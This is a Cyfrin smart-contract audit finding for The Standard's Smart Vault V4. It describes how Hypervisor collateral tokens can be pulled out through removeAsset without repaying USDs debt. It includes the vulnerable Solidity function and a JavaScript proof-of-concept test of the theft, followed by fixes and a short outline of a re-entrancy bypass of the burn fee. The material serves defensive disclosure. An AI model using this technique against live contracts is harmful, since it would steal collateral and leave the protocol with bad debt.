---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2024-09-13-cyfrin-the-standard-smart-vault-v2-0-0-1
ingested_at: '2026-08-09T05:32:30Z'
protocol_category: []
published_at: '2024-09-13T00:00:00Z'
related_swc: []
severity: High
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md
tags:
- firm:cyfrin
- report:2024-09-13-cyfrin-the-standard-smart-vault-v2-0
title: USDs stability can be compromised as collateral can be stolen by removing Hypervisor
  tokens directly from a vault without repaying USDs debt
vuln_class: []
---

# USDs stability can be compromised as collateral can be stolen by removing Hypervisor tokens directly from a vault without repaying USDs debt

_Section severity (from Solodit section header): High_  
_Audit firm: Cyfrin_  
_Source report: [2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md)_

---

**Description:** When the owner of a Smart Vault calls [`SmartVaultV4::depositYield`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L167-L180), [`SmartVaultYieldManager::deposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L299-L310) is invoked to deposit the specified collateral tokens to a given Gamma Vault (aka Hypervisor) via the [`IUniProxy`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/interfaces/IUniProxy.sol#L6) contract. Gamma Hypervisors work such that they hold a position in a Uniswap V3 pool that is made fungible to depositors who own shares in this position represented as an ERC-20 token. On completion of a deposit, the Hypervisor tokens are transferred back to the calling `SmartVaultV4` contract where they remain as backing for any minted `USDs` debt.

However, due to insufficient input validation, these Hypervisor collateral tokens can be removed from the Smart Vault by calling [`SmartVaultV4::removeAsset`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L191-L196):

```solidity
function removeAsset(address _tokenAddr, uint256 _amount, address _to) external onlyOwner {
    ITokenManager.Token memory token = getTokenManager().getTokenIfExists(_tokenAddr);
    if (token.addr == _tokenAddr && !canRemoveCollateral(token, _amount)) revert Undercollateralised();
    IERC20(_tokenAddr).safeTransfer(_to, _amount);
    emit AssetRemoved(_tokenAddr, _amount, _to);
}
```

Hypervisor tokens are present only in the [`SmartVaultV4::hypervisors`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L26) array and are not handled by the `TokenManager` contract, so `token.addr` will equal `address(0)` and the collateralisation check will be bypassed. Thus, these tokens can be extracted from the contract, leaving the Smart Vault in an undercollateralised state and the protocol with bad debt.

**Impact:** An attacker can borrow the maximum mintable amount of `USDs` against their deposited yield collateral, then leave their Smart Vault undercollateralised by simply removing the collateral Hypervisor tokens. The attacker receives both the `USDs` and its backing collateral while the protocol is left with bad debt, likely compromising the stability of `USDs` if executed on a large scale or atomically with funds obtained from a flash loan.

**Proof of Concept:** The following test can be added to `SmartVault.js`:

```javascript
it('can steal collateral hypervisor tokens', async () => {
  const ethCollateral = ethers.utils.parseEther('0.1')
  await user.sendTransaction({ to: Vault.address, value: ethCollateral });

  let { collateral, totalCollateralValue } = await Vault.status();
  let preYieldCollateral = totalCollateralValue;
  expect(getCollateralOf('ETH', collateral).amount).to.equal(ethCollateral);

  depositYield = Vault.connect(user).depositYield(ETH, HUNDRED_PC);
  await expect(depositYield).not.to.be.reverted;
  await expect(depositYield).to.emit(YieldManager, 'Deposit').withArgs(Vault.address, MockWeth.address, ethCollateral, HUNDRED_PC);

  ({ collateral, totalCollateralValue } = await Vault.status());
  expect(getCollateralOf('ETH', collateral).amount).to.equal(0);
  expect(totalCollateralValue).to.equal(preYieldCollateral);

  const mintedValue = ethers.utils.parseEther('100');
  await Vault.connect(user).mint(user.address, mintedValue);

  // Vault is fully collateralised after minting USDs
  expect(await Vault.undercollateralised()).to.be.equal(false);

  const hypervisorBalanceVault = await MockUSDsHypervisor.balanceOf(Vault.address);
  await Vault.connect(user).removeAsset(MockUSDsHypervisor.address, hypervisorBalanceVault , user.address);

  // Vault has no collateral left and as such is undercollateralised
  expect(await MockUSDsHypervisor.balanceOf(Vault.address)).to.be.equal(0);
  expect(await Vault.undercollateralised()).to.be.equal(true);

  // User has both the minted USDs and Hypervisor collateral tokens
  expect(await MockUSDsHypervisor.balanceOf(user.address)).to.be.equal(hypervisorBalanceVault);
  expect(await USDs.balanceOf(user.address)).to.be.equal(mintedValue);
});
```

**Recommended Mitigation:** Validate that the asset removed is not a Hypervisor token present in the `hypervisors` array.

If considering adding the Hypervisor tokens as collateral in the `TokenManager`, ensure that they are excluded from [this loop](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L108-L111) within `SmartVaultV4::usdCollateral` and the [pricing calculation](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L131) in `SmartVaultV4::getAssets` is also updated accordingly.

**The Standard DAO:** Fixed by commit [`5862d8e`](https://github.com/the-standard/smart-vault/commit/5862d8e10ac8648b89a7e3a78498ff20dc31e42e).

**Cyfrin:** Verified, Hypervisor tokens can no longer be removed without causing `SmartVault::removeAsset` to revert due to being undercollateralised. However, the use of the `remainCollateralised()` modifier in `SmartVaultV4::removeCollateralNative` has introduced a re-entrancy vulnerability whereby the protocol burn fee can be bypassed by the Smart Vault owner: deposit native collateral → mint USDs → remove native collateral → re-enter & self-liquidate. Here, the original validation should be used as this does not affect Hypervisor tokens.

**The Standard DAO:** Fixed by commit [`d761d48`](https://github.com/the-standard/smart-vault/commit/d761d48e957d45c5d61eb494d41b7362f7001155).

**Cyfrin:** Verified, `SmartVaultV4::removeCollateralNative` can no longer be used to re-enter in an undercollateralised state.
